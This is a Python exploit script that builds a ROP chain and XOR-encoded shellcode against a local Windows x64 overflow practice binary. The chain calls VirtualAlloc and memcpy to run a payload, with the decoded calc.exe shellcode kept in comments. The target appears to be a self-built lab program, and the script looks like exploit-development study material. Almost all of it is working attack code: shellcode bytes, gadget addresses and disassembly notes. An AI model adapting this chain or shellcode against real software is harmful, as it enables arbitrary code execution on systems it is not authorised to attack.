import struct
import subprocess

payload = b"\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xc9\x48\x8d\x35\xf8\xdd\xdd\xfd\x81\xc6\x22\x22\x22\x02\x48\x89\xf3\x48\x8d\x36\xb1\xcf\xb0\xac\x30\x06\x48\xff\xc6\x48\xff\xc9\x75\xf6\xe4\x2f\x40\x84\xe4\x2f\x48\x5c\xe4\x9d\x65\xc9\xe4\x27\xed\xcc\xe4\x27\xec\xb4\xe4\x27\xdc\xbc\xe4\x27\x9a\xe4\x27\x9a\xe4\x27\xf2\x9c\xe5\x25\x74\x27\xf7\x90\xe0\xad\x6f\xe4\x9d\x65\xca\x2d\x6d\x53\x24\xe4\x6d\x45\xa4\x27\xb8\xa7\xe0\xad\x6e\xe8\x27\xfe\xb8\xe1\x9d\x77\xe8\x27\xf6\x8c\xe1\xad\x6f\xe0\x25\x7d\xe4\x14\xfb\xc5\xc2\xe9\xd4\xc9\xcf\x3c\xe4\x6d\x4c\xa4\xe4\x6d\x44\xa4\xfc\xe4\x25\x4c\xe4\x2f\x68\xa4\xcb\x4f\xbb\x9d\x77\xed\x27\xf0\x27\xa8\xe0\xad\x6f\xe4\x53\x65\xe0\x27\xa4\xe0\x95\xa7\xd8\xaf\xd9\x4a\x60\xfd\xed\xf3\xe0\x25\x55\xe1\x9d\x77\xe8\x27\xf6\x88\xe1\xad\x6f\xe4\x53\x6d\xca\xe9\x27\x80\xe7\xe1\x9d\x77\xe8\x27\xf6\xb0\xe1\xad\x6f\xef\x27\xe8\x07\xa8\xe0\xad\x6c\xfc\xed\xf3\xe4\x9d\x6c\xfc\xe4\x14\xcf\xcd\xc0\xcf\x82\xc9\xd4\xc9\xfc\xe4\x25\x4d\xe4\x9d\x7e\xe4\x53\x6e\xe4\x2f\x40\x9c\xed\x53\x7b" #251 bytes

payload += b"\x41" * 45 # padding/junk (45 bytes)


#original, decoded shellcode for referencing
#############################################

#shellcode =  b"\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b"
#shellcode += b"\x40\x18\x48\x8b\x70\x10\x48\x8b\x36\x48\x8b\x36\x48\x8b\x5e\x30\x49\x89"
#shellcode += b"\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9"
#shellcode += b"\x08\x8b\x14\x0b\x4c\x01\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20"
#shellcode += b"\x4d\x01\xc3\x4c\x89\xd1\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x90\x48\xc1"
#shellcode += b"\xe0\x08\x48\xc1\xe8\x08\x50\x48\x89\xe0\x48\x83\xc4\x08\x67\xe3\x17\x31"
#shellcode += b"\xdb\x41\x8b\x5c\x8b\x04\x4c\x01\xc3\x48\xff\xc9\x4c\x8b\x08\x4c\x39\x0b"
#shellcode += b"\x74\x03\x75\xe6\xcc\x51\x41\x5f\x4c\x89\xf9\x4d\x31\xdb\x44\x8b\x5a\x24"
#shellcode += b"\x4d\x01\xc3\x48\xff\xc1\x66\x45\x8b\x2c\x4b\x4d\x31\xdb\x44\x8b\x5a\x1c"
#shellcode += b"\x4d\x01\xc3\x43\x8b\x44\xab\x04\x4c\x01\xc0\x50\x41\x5f\x48\x31\xc0\x50"
#shellcode += b"\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\x48\x31\xd2\x48"
#shellcode += b"\xff\xc2\x48\x83\xec\x30\x41\xff\xd7"
#calc shellcode no nulls (207 bytes)

#payload += shellcode 

#rop gadgets for setting the R9 register value
###################################

payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140000018)  # 0x40
payload += struct.pack("<Q", 0x140007678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", 0x140001b58)  # push rax; pop rbx; pop rsi; pop rdi; ret;
payload += b"\x90" * 16 
payload += struct.pack("<Q", 0x140007CA5)  # mov r9, rbx <see more below>

"""
0000000140007CA5 | 49:89D9                  | mov r9,rbx                           |
0000000140007CA8 | E8 D3FCFFFF              | call overflow3.140007980             |
0000000140007CAD | 48:98                    | cdqe                                 |
0000000140007CAF | 48:83C4 48               | add rsp,48                           |
0000000140007CB3 | 5B                       | pop rbx                              |
0000000140007CB4 | 5E                       | pop rsi                              |
0000000140007CB5 | 5F                       | pop rdi                              | 
0000000140007CB6 | 5D                       | pop rbp                              |
0000000140007CB7 | C3                       | ret                                  |
"""
payload += b"\x90" * 72 
payload += b"\x90" * 32 

#r9 register should now hold the value 0x40 (I hate this register)
###########################################

#r8 ROP gadgets (this works but RDX MUST be 0x3000)

payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x1400095AC)  # place 3000 on stack --> 0x00000001400095AC = 0x3000
payload += struct.pack("<Q", 0x140007678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", 0x140006995)  # 0x0000000140006995: add edx, eax; mov eax, edx; ret; 

payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x1400095A0)  # place 3000 - 0xC on stack 

payload += struct.pack("<Q", 0x140002410)  # 0000000140002410


#rop gadget(s) for setting the RCX register value
###################################################
payload += struct.pack("<Q", 0x14000276f)  # xor ecx, ecx; mov rax, r9; ret; 
# rcx should now be set to 0
###################################################

#rop gadgets for setting the RDX register value
#####################################################
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001243)  # mov edx, 2; xor ecx, ecx; call rax; 
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x1400000AC)  # place 1000 on stack --> 0x00000001400000AC = 0x1000
payload += struct.pack("<Q", 0x140007678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", 0x140006995)  # add edx, eax; mov eax, edx; ret; 
# RDX should now be set to 1002 (ideally 1000 but I got tired of mathing :D )
######################################################



#VirtualAlloc !!!
######################################################
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x14000D288)  # virtualalloc import address
payload += struct.pack("<Q", 0x140001fb3)  # jmp qword ptr [rax]; 

######################################################


#memcpy
#copies memory from src to dst
#On x64, the parameters for memcpy are passed in these registers:

#rcx: Destination address (dst)
#rdx: Source address (src)
#r8: Number of bytes to copy (n)

#################################################################
#memcpy
#################################################################

#r8 gadget setup
payload += struct.pack("<Q", 0x140001b58)  # push rax; pop rbx; pop rsi; pop rdi; ret;  <-- this is what will go into RSI
payload += struct.pack("<Q", 0x444444444)  # junk
payload += struct.pack("<Q", 0x444444444)  # junk

payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001240)  # xor r8d, r8d; mov edx, 2; xor ecx, ecx; call rax; 
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x1400000AC)  # place 0x1000 on stack
payload += struct.pack("<Q", 0x14000199b)  # js 0x19f8; pop rsi; ret; 
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001DDA)  # see below for this one

"""
0000000140001DDA | 44:8B00                  | mov r8d,dword ptr ds:[rax]           | rax:EntryPoint
0000000140001DDD | 45:85C0                  | test r8d,r8d                         |
0000000140001DE0 | 74 0D                    | je overflow.140001DEF                |
0000000140001DE2 | 48:8B50 10               | mov rdx,qword ptr ds:[rax+10]        | rdx:EntryPoint
0000000140001DE6 | 48:8B48 08               | mov rcx,qword ptr ds:[rax+8]         |
0000000140001DEA | 49:89F9                  | mov r9,rdi                           | r9:EntryPoint
0000000140001DED | FFD6                     | call rsi                             |
"""

#R8 should now be set to 0x90


#Gadget route for rcx
#====================

payload += struct.pack("<Q", 0x14000276f)  # xor ecx, ecx; mov rax, r9; ret; 
payload += struct.pack("<Q", 0x1400027a0)  # add ecx, ebx; mov rax, r9; ret; 
# RCX should now hold the dest address
#######################################################

#Gadget route for RDX
#######################################################
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x5FFB01)     # 0x5FFBE0 (will have 200 added from edx)
payload += struct.pack("<Q", 0x1400025a6)  # add edx, eax; cmp dword ptr [rdx], 0x4550; je 0x25b8; ret; 
#RDX should now be set


#call memcpy!
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140007D78)  # memcpy (want to jmp to this in the future!)

payload += struct.pack("<Q", 0x14000192f)  # jmp rax; 
payload += struct.pack("<Q", 0x14000192f)  # jmp rax;

# Run the vulnerable program and supply the payload
process = subprocess.Popen(
    ["C:/Users/robbi/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

#uncomment to allow debugging in x64dbg
input("attach 'overflow.exe' to x64Dbg and press enter when you're ready to continue...")

# Send the payload
stdout, stderr = process.communicate(input=payload)

# Output the program's response
print(stdout.decode())
if stderr:
    print(stderr.decode())
